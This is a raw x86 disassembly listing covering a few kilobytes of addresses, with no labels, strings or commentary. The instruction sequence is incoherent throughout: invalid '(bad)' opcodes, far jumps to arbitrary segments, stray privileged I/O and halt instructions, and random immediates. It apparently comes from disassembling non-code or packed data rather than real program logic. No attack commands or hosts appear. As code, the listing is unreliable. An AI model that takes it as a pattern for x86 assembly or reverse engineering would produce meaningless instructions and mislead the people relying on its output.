  42395d:	mov    bh,0xea
  42395f:	shl    DWORD PTR [edi+eax*1+0x2cd7714c],0x7c
  423967:	lods   al,BYTE PTR ds:[esi]
  423968:	xor    bh,BYTE PTR [ebx]
  42396a:	fs jg  0x4239cf
  42396d:	and    bl,bh
  42396f:	dec    edi
  423970:	add    DWORD PTR [ecx-0x29998455],ebx
  423976:	retf   
  423977:	push   eax
  423978:	jae    0x4238fe
  42397a:	jge    0x4239cd
  42397c:	(bad)  
  42397d:	mov    al,ds:0xbb5faade
  423982:	nop
  423983:	jmp    0x81f7:0xd08115
  42398a:	scas   al,BYTE PTR es:[edi]
  42398b:	inc    ebp
  42398c:	in     al,0x83
  42398e:	test   eax,0x3b7b1c5f
  423993:	js     0x42393a
  423995:	enter  0x2,0x82
  423999:	mov    edx,0x57a53a96
  42399e:	dec    esp
  42399f:	imul   ecx,DWORD PTR [edx-0x24c145cd],0xa7f11b35
  4239a9:	mov    ch,0xcc
  4239ab:	mov    bh,0xb1
  4239ad:	(bad)  
  4239ae:	aas    
  4239af:	pop    ebp
  4239b0:	push   edi
  4239b1:	jae    0x423943
  4239b3:	imul   eax,ebx,0x29
  4239b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239b7:	in     eax,0x6e
  4239b9:	mov    esi,0x946d1461
  4239be:	push   ecx
  4239bf:	cmp    bh,BYTE PTR [edx]
  4239c1:	push   ebx
  4239c2:	push   ss
  4239c3:	aad    0xd8
  4239c5:	clc    
  4239c6:	jmp    0xbe5:0x60325c59
  4239cd:	xchg   ebx,eax
  4239ce:	mov    ds:0x4bc6482f,eax
  4239d3:	mov    dh,0xd
  4239d5:	push   ebx
  4239d6:	mov    dh,ah
  4239d8:	mov    edx,0x1a6ceba5
  4239dd:	sahf   
  4239de:	or     BYTE PTR [edx+ebx*1+0x68b1a198],al
  4239e5:	call   0xbe60:0xb6cdc0a
  4239ec:	imul   esi,DWORD PTR [ebx-0x5b],0xcf5dc7e2
  4239f3:	fadd   DWORD PTR [esi-0x6d86ffcb]
  4239f9:	cdq    
  4239fa:	sbb    bh,BYTE PTR [ecx-0x683f125e]
  423a00:	ficom  WORD PTR [edx+0x2f]
  423a03:	les    ebp,FWORD PTR [esi]
  423a05:	lds    edx,FWORD PTR [ebx-0x29f341f8]
  423a0b:	dec    ebp
  423a0c:	push   0x11554280
  423a11:	and    DWORD PTR [edi-0x250a32d4],ebx
  423a17:	and    DWORD PTR [edi-0x14798aba],esp
  423a1d:	xchg   ebx,eax
  423a1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a1f:	lods   eax,DWORD PTR es:[esi]
  423a21:	fs sub al,0x3f
  423a24:	enter  0x82b0,0x35
  423a28:	sbb    BYTE PTR [ebx],0x20
  423a2b:	xchg   edi,eax
  423a2c:	jo     0x4239ca
  423a2e:	and    BYTE PTR [eax+ebp*8-0x39],0x1e
  423a33:	xor    bh,dh
  423a35:	mov    bh,BYTE PTR [edi+0x35bcb424]
  423a3b:	add    ecx,DWORD PTR [edi+0x32]
  423a3e:	sub    bl,BYTE PTR [eax-0x7360d77f]
  423a44:	mov    ecx,0x9b499fc0
  423a49:	std    
  423a4a:	ret    
  423a4b:	retf   
  423a4c:	mov    dl,0x4b
  423a4e:	add    ch,BYTE PTR [edi-0x4f9a01c]
  423a54:	fldcw  WORD PTR [eax]
  423a56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a57:	adc    DWORD PTR ds:0x3439b75f,ecx
  423a5d:	fisub  WORD PTR [eax]
  423a5f:	fistp  WORD PTR [esi+0x7b]
  423a62:	or     ah,bl
  423a64:	jb     0x4239f7
  423a66:	retf   
  423a67:	in     al,dx
  423a68:	push   esp
  423a69:	xchg   esp,eax
  423a6a:	(bad)  
  423a6b:	push   ds
  423a6c:	mov    ecx,0xb9e60fb3
  423a71:	adc    al,0x99
  423a73:	out    0x9a,eax
  423a75:	test   BYTE PTR [ebp+0x37b521b2],cl
  423a7b:	mov    al,0x79
  423a7d:	mov    esi,0x4cc108e9
  423a82:	iret   
  423a83:	sbb    DWORD PTR [edi],edi
  423a85:	jae    0x423a9c
  423a87:	mov    ebp,0x803ddbfd
  423a8c:	aaa    
  423a8d:	mov    esi,0x2e4e9b9c
  423a92:	jb     0x423a1e
  423a94:	jle    0x423a6a
  423a96:	ret    0x4981
  423a99:	push   ebx
  423a9a:	rcr    DWORD PTR [edx],cl
  423a9c:	pusha  
  423a9d:	popa   
  423a9e:	or     BYTE PTR [esi],cl
  423aa0:	fcmovnu st,st(3)
  423aa2:	cmc    
  423aa3:	int    0x90
  423aa5:	jae    0x423a44
  423aa7:	sbb    DWORD PTR [edx],ecx
  423aa9:	outs   dx,BYTE PTR ds:[esi]
  423aaa:	inc    ebp
  423aab:	out    0x2b,eax
  423aad:	int3   
  423aae:	test   al,0xd1
  423ab0:	rcr    esi,0x3d
  423ab3:	cmp    ah,dh
  423ab5:	jmp    0x7bc8:0x6ba7e165
  423abc:	inc    ecx
  423abd:	adc    DWORD PTR [ebx+0x1],edx
  423ac0:	in     eax,0x46
  423ac2:	int3   
  423ac3:	mov    eax,ds:0x4485618b
  423ac8:	std    
  423ac9:	inc    eax
  423aca:	int3   
  423acb:	stos   DWORD PTR es:[edi],eax
  423acc:	jns    0x423b0a
  423ace:	jle    0x423abe
  423ad0:	fldenv [ecx-0x50]
  423ad3:	sti    
  423ad4:	jmp    0xc670:0x49e1d2aa
  423adb:	retf   0x91a4
  423ade:	and    BYTE PTR [edi-0x4991f037],al
  423ae4:	mov    WORD PTR [ecx+0x34],cs
  423ae7:	jb     0x423af9
  423ae9:	in     eax,0x74
  423aeb:	dec    ebp
  423aec:	popa   
  423aed:	cmp    eax,DWORD PTR [ebp+esi*1-0x2]
  423af1:	mov    dl,0xb9
  423af3:	dec    BYTE PTR [ecx+0x68]
  423af6:	and    dl,BYTE PTR [esi-0x52444c50]
  423afc:	xchg   esp,eax
  423afd:	shl    BYTE PTR [ebp-0x37648cb1],0xbd
  423b04:	mov    BYTE PTR [esi],0x28
  423b07:	and    bl,ch
  423b09:	cwde   
  423b0a:	mov    edi,0xe08004
	...
  423b17:	add    BYTE PTR [eax],al
  423b19:	add    BYTE PTR [esi-0x4fd6421],dh
  423b1f:	inc    esi
  423b20:	mov    edi,0x261aff
  423b25:	jb     0x423abb
  423b27:	adc    ebp,DWORD PTR [ecx+0x39]
  423b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b2b:	mov    ah,0x1
  423b2d:	add    ah,bh
  423b2f:	add    DWORD PTR [eax],eax
  423b31:	add    BYTE PTR [ecx+0x3c],al
  423b34:	test   DWORD PTR [ebx+esi*1+0x3fbe2071],ebx
  423b3b:	mov    cl,0xde
  423b3d:	pop    ebx
  423b3e:	mov    WORD PTR [edx-0x2c1df579],?
  423b44:	xchg   esi,eax
  423b45:	mov    ebx,fs
  423b47:	fdiv   DWORD PTR [ebp+ecx*4-0x30]
  423b4b:	xchg   esp,eax
  423b4c:	ret    0xb60b
  423b4f:	mov    ebx,0xbd52c2c0
  423b54:	jbe    0x423b47
  423b56:	pusha  
  423b57:	popa   
  423b58:	in     eax,0x37
  423b5a:	jae    0x423b62
  423b5c:	addr16 ss mov esp,0x76b28ad1
  423b63:	push   ebp
  423b64:	scas   al,BYTE PTR es:[edi]
  423b65:	enter  0x625,0x9
  423b69:	je     0x423aec
  423b6b:	mov    edi,0x8273df1d
  423b70:	sub    al,0xf4
  423b72:	pushf  
  423b73:	mov    ss,WORD PTR [edx-0x42]
  423b76:	int    0xc7
  423b78:	arpl   ax,si
  423b7a:	pop    ebx
  423b7b:	es loopne 0x423b74
  423b7e:	enter  0xcf18,0x2d
  423b82:	sub    eax,0xf5bced11
  423b87:	ins    DWORD PTR es:[edi],dx
  423b88:	push   0xd7aa080c
  423b8d:	(bad)  
  423b8e:	cmp    ah,BYTE PTR [esp+ebp*4-0x4a]
  423b92:	adc    eax,0x7a867f9a
  423b97:	stc    
  423b98:	out    0x2,eax
  423b9a:	mov    esi,0x33e5c523
  423b9f:	mov    WORD PTR [eax],fs
  423ba1:	pop    ss
  423ba2:	jo     0x423b56
  423ba4:	sti    
  423ba5:	test   DWORD PTR [edx],ecx
  423ba7:	test   bl,0x30
  423baa:	sbb    ah,dl
  423bac:	popa   
  423bad:	jne    0x423bf1
  423baf:	push   0xb867ede0
  423bb4:	shl    BYTE PTR [edi+0x1d],cl
  423bb7:	sti    
  423bb8:	sub    DWORD PTR [ebx-0x62],esp
  423bbb:	ss push edx
  423bbd:	mov    ebx,0xfa864214
  423bc2:	sbb    al,0x7c
  423bc4:	ins    DWORD PTR es:[edi],dx
  423bc5:	arpl   WORD PTR [ebp+esi*8-0x2c],cx
  423bc9:	inc    ebp
  423bca:	leave  
  423bcb:	push   edx
  423bcc:	push   ss
  423bcd:	rcr    DWORD PTR [ecx+0x988126a],cl
  423bd3:	sahf   
  423bd4:	sbb    DWORD PTR [ebp+0x31],ebx
  423bd7:	call   0x956e691
  423bdc:	hlt    
  423bdd:	mov    dh,0xeb
  423bdf:	cmp    dh,al
  423be1:	leave  
  423be2:	(bad)  
  423be4:	out    dx,eax
  423be5:	popf   
  423be6:	test   eax,0x8133c55b
  423beb:	xchg   esp,eax
  423bec:	(bad)
  423bef:	sub    al,0x4d
  423bf1:	mov    WORD PTR [eax],ss
  423bf3:	mov    edi,0xd02864c9
  423bf8:	ja     0x423b8d
  423bfa:	push   ss
  423bfb:	fs mov ecx,0xac5b806c
  423c01:	mov    ecx,ecx
  423c03:	xlat   BYTE PTR ds:[ebx]
  423c04:	xor    ah,cl
  423c06:	stos   DWORD PTR es:[edi],eax
  423c07:	ror    esi,1
  423c09:	fwait
  423c0a:	sub    al,ch
  423c0c:	adc    ecx,0x74364500
  423c12:	in     eax,dx
  423c13:	pop    eax
  423c14:	dec    ecx
  423c15:	inc    edi
  423c16:	xchg   ecx,eax
  423c17:	call   0x270b:0x3efbf072
  423c1e:	enter  0x8fdd,0xd4
  423c22:	dec    ecx
  423c23:	xchg   BYTE PTR [edx+0x20dc5782],dh
  423c29:	adc    eax,0x229c4dc9
  423c2e:	inc    edi
  423c2f:	mov    bl,0x4b
  423c31:	jle    0x423c9b
  423c33:	es dec ebx
  423c35:	jp     0x423cb3
  423c37:	sahf   
  423c38:	cld    
  423c39:	sub    cl,cl
  423c3b:	cdq    
  423c3c:	mov    esi,0x8f7e15ad
  423c41:	mov    esi,DWORD PTR [esi-0x10ead439]
  423c47:	mov    WORD PTR [esi-0x15],?
  423c4a:	mov    bh,0x46
  423c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c4d:	ins    BYTE PTR es:[edi],dx
  423c4e:	cdq    
  423c4f:	scas   al,BYTE PTR es:[edi]
  423c50:	add    BYTE PTR [ecx-0x4],dl
  423c53:	(bad)  
  423c54:	(bad)  
  423c55:	mov    ds:0xd7180d99,al
  423c5a:	outs   dx,DWORD PTR ds:[esi]
  423c5b:	xchg   edx,eax
  423c5c:	or     al,0x9c
  423c5e:	repnz add dh,BYTE PTR [esi+ebp*1]
  423c62:	push   ebp
  423c63:	scas   al,BYTE PTR es:[edi]
  423c64:	mov    ebp,0xeef0be13
  423c69:	aad    0x29
  423c6b:	xchg   ebx,eax
  423c6c:	aam    0xb2
  423c6e:	mov    dh,0x81
  423c70:	popa   
  423c71:	pop    ecx
  423c72:	push   edi
  423c73:	icebp  
  423c74:	repz pop edi
  423c76:	rol    BYTE PTR [edi+ecx*2+0xf1da1fa],0x1b
  423c7e:	hlt    
  423c7f:	pop    ss
  423c80:	adc    ecx,ebp
  423c82:	test   eax,0x67e9c8ac
  423c87:	jbe    0x423caa
  423c89:	push   eax
  423c8a:	call   0x2075:0x87295352
  423c91:	jge    0x423c82
  423c93:	xor    esp,ebp
  423c95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c96:	out    dx,al
  423c97:	pop    ebp
  423c98:	push   ebp
  423c99:	jecxz  0x423cae
  423c9b:	add    al,0x2
  423c9d:	push   ecx
  423c9e:	push   esi
  423c9f:	cmp    DWORD PTR [ebx+ecx*1-0x288688b],esp
  423ca6:	cmp    al,0xf
  423ca8:	fistp  QWORD PTR [eax+0x53856edb]
  423cae:	jg     0x423ca7
  423cb0:	jno    0x423c7e
  423cb2:	jl     0x423d19
  423cb4:	int3   
  423cb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cb6:	mov    dh,0xb5
  423cb8:	ins    BYTE PTR es:[edi],dx
  423cb9:	inc    ebx
  423cba:	xor    DWORD PTR [esi+eiz*1+0x3f],0xffffffb4
  423cbf:	and    al,0x7d
  423cc1:	ins    BYTE PTR es:[edi],dx
  423cc2:	or     DWORD PTR [ebx],esi
  423cc4:	popf   
  423cc5:	cs ret 
  423cc7:	mov    ds:0x478af798,eax
  423ccc:	pushf  
  423ccd:	mov    al,ds:0x293a1ced
  423cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423cd3:	pop    edx
  423cd4:	mov    es,WORD PTR [esi]
  423cd6:	sbb    si,WORD PTR [ebp+eax*8+0x3f]
  423cdb:	data16 aad 0x6c
  423cde:	retf   
  423cdf:	push   esi
  423ce0:	jp     0x423cb8
  423ce2:	cmp    esi,DWORD PTR [edi+0x64]
  423ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ce6:	sbb    ebx,DWORD PTR [esi+0x14]
  423ce9:	inc    ebx
  423cea:	and    eax,0x88f85aaf
  423cef:	pop    ds
  423cf0:	fcmovb st,st(6)
  423cf2:	xlat   BYTE PTR ds:[ebx]
  423cf3:	sbb    al,BYTE PTR [ebx]
  423cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cf6:	ins    DWORD PTR es:[edi],dx
  423cf7:	xor    al,BYTE PTR [edi+0x33]
  423cfa:	mov    dh,0x5
  423cfc:	mov    al,0xd2
  423cfe:	xchg   edx,eax
  423cff:	repz rcr DWORD PTR [edx-0x46],0xe9
  423d04:	pop    esp
  423d05:	scas   eax,DWORD PTR es:[edi]
  423d06:	add    ah,cl
  423d08:	out    0x9f,al
  423d0a:	xchg   DWORD PTR [ebx],esi
  423d0c:	add    esi,esi
  423d0e:	sub    al,BYTE PTR [ecx-0x2153ee8b]
  423d14:	mov    esp,DWORD PTR [esp+ebp*8+0x2d]
  423d18:	mov    esp,ebp
  423d1a:	sbb    esi,0xffffffbc
  423d1d:	cdq    
  423d1e:	or     eax,0xfc4f1c18
  423d23:	mov    ah,0x2f
  423d25:	dec    ecx
  423d26:	je     0x423cfc
  423d28:	sub    eax,0x1c52d4b0
  423d2d:	jl     0x423d2f
	...
  423d37:	add    BYTE PTR [eax],al
  423d39:	add    al,bh
  423d3b:	mov    ah,0x7f
  423d3d:	cmp    eax,0xf5faff7f
  423d42:	mov    edx,0x3f57ffb2
  423d47:	ret    
  423d48:	icebp  
  423d49:	mov    ah,BYTE PTR [eax-0x3fffe4a]
  423d4f:	add    DWORD PTR [eax],eax
  423d51:	add    BYTE PTR [ebx+0x13631bb],dh
  423d57:	fadd   DWORD PTR [edi]
  423d59:	test   eax,0xa7c99223
  423d5e:	ror    BYTE PTR [ebx],1
  423d60:	lods   eax,DWORD PTR ds:[esi]
  423d61:	outs   dx,DWORD PTR ds:[esi]
  423d62:	cmp    al,0x85
  423d64:	popf   
  423d65:	jns    0x423d8d
  423d67:	xchg   edx,eax
  423d68:	loope  0x423d15
  423d6a:	xchg   edi,eax
  423d6b:	int3   
  423d6c:	xchg   bl,cl
  423d6e:	mov    ah,0xd9
  423d70:	retf   
  423d71:	fstp   TBYTE PTR [edx-0x28]
  423d74:	jl     0x423d4b
  423d76:	xchg   BYTE PTR ds:0xc5c9541d,cl
  423d7c:	jg     0x423d11
  423d7e:	sub    DWORD PTR [ebx+0x1e],esi
  423d81:	(bad)  
  423d82:	sbb    DWORD PTR [ebx],eax
  423d84:	int    0xd7
  423d86:	mov    ds:0xc821a32b,eax
  423d8b:	stos   DWORD PTR es:[edi],eax
  423d8c:	ss in  eax,dx
  423d8e:	mov    ds:0xc7ff4ca9,al
  423d93:	and    BYTE PTR [esi+0x6],al
  423d96:	stc    
  423d97:	and    dh,BYTE PTR [ebx]
  423d99:	lods   eax,DWORD PTR ds:[esi]
  423d9b:	js     0x423da9
  423d9d:	sbb    ah,BYTE PTR [edi+0x23]
  423da0:	or     al,0x44
  423da2:	xor    esp,ebp
  423da4:	daa    
  423da5:	or     ebp,DWORD PTR cs:[ebx+esi*4]
  423da9:	loop   0x423d51
  423dab:	push   eax
  423dad:	(bad)  
  423dae:	cwde   
  423daf:	test   al,0x6f
  423db1:	stc    
  423db2:	ins    DWORD PTR es:[edi],dx
  423db3:	xchg   edi,eax
  423db4:	hlt    
  423db5:	sub    al,0xff
  423db7:	mov    ds:0x12da7fe6,al
  423dbc:	mov    ah,0xd4
  423dbe:	aaa    
  423dbf:	cmp    edx,0xffffffa7
  423dc2:	stos   BYTE PTR es:[edi],al
  423dc3:	in     al,dx
  423dc4:	dec    esi
  423dc5:	aaa    
  423dc6:	arpl   WORD PTR [eax+0x14ba2cbc],bx
  423dcc:	add    DWORD PTR [ecx-0xcabf770],edi
  423dd2:	cmp    DWORD PTR [ecx+0x2d],ebp
  423dd5:	retf   0xbc4a
  423dd8:	jmp    0x7aaa:0x222342d8
  423ddf:	(bad)  
  423de0:	aad    0x76
  423de2:	pusha  
  423de3:	pushf  
  423de4:	sbb    BYTE PTR [edi+ebx*2],0xd0
  423de8:	ret    0xc162
  423deb:	push   ebx
  423dec:	inc    edx
  423ded:	and    eax,0xeb96c60f
  423df2:	mov    ebp,0x4157deea
  423df7:	jns    0x423e1f
  423df9:	mov    ds:0xb0f52a12,eax
  423dfe:	popa   
  423dff:	jg     0x423e3f
  423e01:	pop    ss
  423e02:	icebp  
  423e03:	cmp    BYTE PTR [edi-0x46],0xbc
  423e07:	and    DWORD PTR [ebp-0xd],0x27
  423e0b:	mov    edi,0xc38bfc4d
  423e10:	sub    esp,ecx
  423e12:	jg     0x423dc1
  423e14:	es pushf 
  423e16:	sub    BYTE PTR [eax],al
  423e18:	add    eax,0x1cf74256
  423e1d:	xchg   edi,eax
  423e1e:	push   edx
  423e1f:	iret   
  423e20:	popa   
  423e21:	inc    DWORD PTR [ebx]
  423e23:	xchg   edx,edx
  423e25:	je     0x423e20
  423e27:	mov    ah,0x53
  423e29:	jge    0x423db1
  423e2b:	push   esi
  423e2c:	dec    edx
  423e2d:	push   ebx
  423e2e:	xchg   edx,eax
  423e2f:	sbb    DWORD PTR [edx+0x32a6eb70],ebx
  423e35:	fwait
  423e36:	(bad)
  423e39:	cmp    esp,edx
  423e3b:	les    esp,FWORD PTR [esi+0x4a]
  423e3e:	shr    DWORD PTR [ebx],cl
  423e40:	ins    DWORD PTR es:[edi],dx
  423e41:	mov    bl,0xc0
  423e43:	mov    edx,0x750ee9c7
  423e48:	mov    ch,0x6a
  423e4a:	inc    ecx
  423e4b:	sbb    al,0x66
  423e4d:	xlat   BYTE PTR ds:[ebx]
  423e4e:	push   es
  423e4f:	push   cs
  423e50:	xchg   ebx,eax
  423e51:	and    eax,0xa13353d
  423e56:	jmp    0x165e:0x401b1869
  423e5d:	jle    0x423e87
  423e5f:	(bad)  
  423e60:	(bad)  
  423e61:	ins    BYTE PTR es:[edi],dx
  423e62:	ret    
  423e63:	dec    edx
  423e64:	jns    0x423e65
  423e66:	jae    0x423e7a
  423e68:	lods   al,BYTE PTR fs:[esi]
  423e6a:	mov    esi,DWORD PTR [ebp-0x4d]
  423e6d:	aas    
  423e6e:	mov    DWORD PTR [edi+ecx*1+0x48],edx
  423e72:	xchg   ebx,eax
  423e73:	enter  0xb663,0x3a
  423e77:	jns    0x423e6b
  423e79:	pusha  
  423e7a:	xor    al,0xf
  423e7c:	xor    eax,0x1ed5fbdd
  423e81:	or     DWORD PTR [edx+0x229a7e07],ecx
  423e87:	popf   
  423e88:	bound  edi,QWORD PTR [edi-0x1830558c]
  423e8e:	call   FWORD PTR [eax+0xb]
  423e91:	es mov al,0xb1
  423e94:	call   0xc783e0fa
  423e99:	rcl    BYTE PTR [esi-0x345f7bf2],1
  423e9f:	shl    edi,cl
  423ea1:	cmp    dh,BYTE PTR [ecx]
  423ea3:	sbb    BYTE PTR [ecx+0xc],ch
  423ea6:	(bad)  
  423ea7:	cwde   
  423ea8:	shr    BYTE PTR [esi+0x63],0x7a
  423eac:	and    BYTE PTR [ebx+0x4e6aeb1f],0xc
  423eb3:	jmp    0x4f64bf2c
  423eb8:	push   eax
  423eb9:	dec    esp
  423eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ebb:	cmp    bh,BYTE PTR [ebp+0x1b97b65]
  423ec1:	and    eax,0x69c47400
  423ec6:	push   0x17764d18
  423ecb:	pop    eax
  423ecc:	pop    edi
  423ecd:	pop    ebx
  423ece:	mov    ebx,0xf45bda8
  423ed3:	sbb    al,0xe0
  423ed5:	popf   
  423ed6:	sub    ecx,DWORD PTR [ebx]
  423ed8:	sti    
  423ed9:	xor    ebp,ebp
  423edb:	push   eax
  423edc:	sub    esp,DWORD PTR [edi-0x75c585e1]
  423ee2:	sub    ah,bl
  423ee4:	sbb    ah,bl
  423ee6:	xchg   BYTE PTR [edi],al
  423ee8:	aam    0xf9
  423eea:	jecxz  0x423f24
  423eec:	push   esi
  423eed:	mov    cl,0xd9
  423eef:	pop    eax
  423ef0:	push   esi
  423ef1:	add    al,0x5c
  423ef3:	pop    ebp
  423ef5:	(bad)  
  423ef6:	dec    esp
  423ef7:	add    ecx,DWORD PTR [eax+esi*1+0x63]
  423efb:	hlt    
  423efc:	mov    dh,0xbd
  423efe:	icebp  
  423eff:	and    ch,BYTE PTR [edi-0x2e]
  423f02:	xchg   esp,eax
  423f03:	cmp    al,0x20
  423f05:	jns    0x423ea0
  423f07:	rol    DWORD PTR [edi+eax*8+0x4ec33301],cl
  423f0e:	add    bh,dh
  423f10:	xchg   DWORD PTR [edi-0x51],esi
  423f13:	sahf   
  423f14:	mov    ebx,0xd7e2cbae
  423f19:	adc    ebx,DWORD PTR [edi]
  423f1b:	and    dh,al
  423f1d:	dec    ebp
  423f1e:	scas   eax,DWORD PTR es:[edi]
  423f1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f20:	jg     0x423f8b
  423f22:	mov    WORD PTR [esi+0x2f],ds
  423f25:	aas    
  423f26:	in     eax,dx
  423f27:	sbb    DWORD PTR [eax],esi
  423f29:	pop    es
  423f2a:	(bad)  
  423f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f2c:	dec    eax
  423f2d:	mov    dh,0x43
  423f2f:	dec    ebx
  423f30:	mov    esi,0x5ccae5bc
  423f36:	dec    edi
  423f37:	mov    esi,0x2245ac1d
  423f3c:	lods   eax,DWORD PTR ds:[esi]
  423f3d:	test   BYTE PTR [ebp+ebx*2-0x2e2ef202],cl
  423f44:	pop    eax
  423f45:	rcl    DWORD PTR [esi+0x67],1
  423f48:	lea    ebp,[eax+0x58]
  423f4b:	aaa    
  423f4c:	add    eax,0x8c
	...
  423f59:	add    BYTE PTR [ecx],bh
  423f5b:	sbb    al,0x89
  423f5d:	out    0xad,eax
  423f5f:	idiv   DWORD PTR [edi-0x22]
  423f62:	test   eax,0x76e902b9
  423f67:	adc    al,0x63
  423f69:	dec    esp
  423f6a:	pushf  
  423f6b:	mov    eax,0x1fc0001
  423f70:	add    BYTE PTR [eax],al
  423f72:	das    
  423f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f74:	sbb    BYTE PTR [eax-0x448980e6],bl
  423f7a:	inc    edx
  423f7b:	loope  0x423f31
  423f7d:	and    ah,BYTE PTR [eax+0x44]
  423f80:	cwde   
  423f81:	pop    ecx
  423f82:	pop    edx
  423f83:	lods   al,BYTE PTR ds:[esi]
  423f84:	inc    ecx
  423f85:	and    DWORD PTR [edi+0x48a19380],edx
  423f8b:	bound  esi,QWORD PTR [eax]
  423f8d:	ja     0x423ff0
  423f8f:	xchg   ebp,eax
  423f90:	lahf   
  423f91:	mov    edx,DWORD PTR [ecx-0x701f224d]
  423f97:	xchg   cl,ah
  423f99:	cmp    al,0xdf
  423f9b:	gs and ebp,0xffffffe4
  423f9f:	ret    0x2d5e
  423fa2:	mov    eax,0x1cc73ef2
  423fa7:	inc    edi
  423fa8:	aam    0x81
  423faa:	std    
  423fab:	sub    BYTE PTR [edx+eax*1],0x7d
  423faf:	fisub  WORD PTR [edx]
  423fb1:	push   edi
  423fb2:	fnsave [edx]
  423fb4:	push   edx
  423fb5:	xchg   ebx,eax
  423fb6:	jb     0x42401a
  423fb8:	adc    DWORD PTR [ecx-0x58],edx
  423fbb:	int    0x37
  423fbd:	ret    
  423fbe:	jo     0x423f8d
  423fc0:	jbe    0x423faa
  423fc2:	sbb    eax,0xba9e58cc
  423fc7:	cmp    ebp,esi
  423fc9:	adc    bl,BYTE PTR [eax+0x6f]
  423fcc:	aad    0xbc
  423fce:	lods   al,BYTE PTR ds:[esi]
  423fcf:	rcr    cl,0xf9
  423fd2:	pop    eax
  423fd3:	lds    edi,FWORD PTR [edx-0xbb6bd39]
  423fd9:	inc    ebp
  423fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fdb:	and    esp,edi
  423fdd:	fs push 0x3f
  423fe0:	call   0xb785e271
  423fe5:	and    al,0xc4
  423fe7:	in     al,0xef
  423fe9:	imul   ebx,DWORD PTR [eax-0x28e59f2c],0xce84b91b
  423ff3:	test   DWORD PTR [ebx-0x4e79101b],eax
  423ff9:	dec    edi
  423ffa:	cmp    ch,bh
  423ffc:	pushf  
  423ffd:	int3   
  423ffe:	pop    ss
  423fff:	pop    edi
  424000:	dec    ecx
  424001:	cmp    dh,BYTE PTR [esi]
  424003:	loop   0x423fa1
  424005:	(bad)  
  424006:	and    ah,BYTE PTR [edi]
  424008:	mov    ecx,0x201a3d66
  42400d:	inc    edx
  42400e:	xchg   ch,ch
  424010:	adc    DWORD PTR [ebp+0x2e7b5023],0xfffffff4
  424017:	in     eax,dx
  424018:	mov    ebp,DWORD PTR ds:0xee083aa0
  42401e:	mov    esp,0xce0a005b
  424023:	repz fmul QWORD PTR [edi+edx*8+0x135ca48c]
  42402b:	pop    edi
  42402c:	out    dx,al
  42402d:	inc    ebp
  42402e:	jo     0x424047
  424030:	retf   0xfe5f
  424033:	cmp    al,0xf6
  424035:	add    eax,0xbf04282a
  42403a:	dec    ebp
  42403b:	xchg   ecx,eax
  42403c:	cld    
  42403d:	jbe    0x424062
  42403f:	push   esp
  424040:	adc    ebp,ebx
  424042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424043:	retf   
  424044:	addr16 push es
  424046:	push   es
  424047:	ret    0x6f98
  42404a:	inc    ebx
  42404b:	mov    eax,ds:0x46d3c523
  424050:	call   0xc63e:0xda064518
  424057:	clc    
  424058:	inc    esi
  424059:	daa    
  42405a:	inc    ecx
  42405b:	xchg   BYTE PTR [edx],dl
  42405d:	call   eax
  42405f:	stos   BYTE PTR es:[edi],al
  424060:	ficomp DWORD PTR [eax]
  424062:	popf   
  424063:	std    
  424064:	or     al,0xce
  424066:	pushf  
  424067:	nop
  424068:	loop   0x424097
  42406a:	scas   al,BYTE PTR es:[edi]
  42406b:	and    dh,al
  42406d:	add    al,0x65
  42406f:	mov    ds:0x10448695,eax
  424074:	cmp    BYTE PTR [edx-0x5d612f0b],bh
  42407a:	scas   eax,DWORD PTR es:[edi]
  42407b:	cld    
  42407c:	jmp    0x842c4c2d
  424081:	inc    edx
  424082:	scas   al,BYTE PTR es:[edi]
  424083:	(bad)  
  424084:	pop    esp
  424085:	dec    eax
  424086:	es push ebp
  424088:	cli    
  424089:	aaa    
  42408a:	fsub   QWORD PTR [ebx+0x61]
  42408d:	lock pusha 
  42408f:	and    ah,BYTE PTR [eax+eiz*1]
  424092:	inc    edx
  424093:	fsubr  QWORD PTR [edi-0x641bae36]
  424099:	cwde   
  42409a:	add    eax,0xe33b7cf5
  42409f:	jns    0x424095
  4240a1:	(bad)  
  4240a2:	int    0xca
  4240a4:	(bad)  
  4240a5:	push   ecx
  4240a6:	pop    ebx
  4240a7:	ret    
  4240a8:	xor    DWORD PTR [ebp+0x1b1c751],edi
  4240ae:	fwait
  4240af:	test   esi,0x1d8953b
  4240b5:	cmp    DWORD PTR [esi+edx*2-0x78e3deba],edx
  4240bc:	inc    ecx
  4240bd:	test   DWORD PTR [ebp+edx*2+0x20],ebx
  4240c1:	mov    ds:0xeb87779,al
  4240c6:	fidiv  WORD PTR [ebx-0x2c]
  4240c9:	dec    ebx
  4240ca:	retf   
  4240cb:	push   ecx
  4240cc:	inc    esi
  4240cd:	sub    dh,dh
  4240cf:	sti    
  4240d0:	push   0xffffffa7
  4240d2:	cmp    edi,edi
  4240d4:	iret   
  4240d5:	xchg   ebx,eax
  4240d6:	inc    esi
  4240d7:	and    BYTE PTR [edx-0x76],cl
  4240da:	mov    ch,0xc3
  4240dc:	test   eax,0xb392fa84
  4240e1:	mov    ch,0x3e
  4240e3:	imul   esi,DWORD PTR [esi+0x6a42093a],0x25
  4240ea:	cdq    
  4240eb:	stos   BYTE PTR es:[edi],al
  4240ec:	cli    
  4240ed:	mov    dl,0x22
  4240ef:	ret    0xc013
  4240f2:	loopne 0x4240b4
  4240f4:	mov    bl,BYTE PTR fs:[bx+si+0x4411]
  4240fa:	cmp    esp,eax
  4240fc:	into   
  4240fd:	call   0x11ef:0x520759e0
  424104:	sub    DWORD PTR [esi+0x16],0xfffffff9
  424108:	dec    ebp
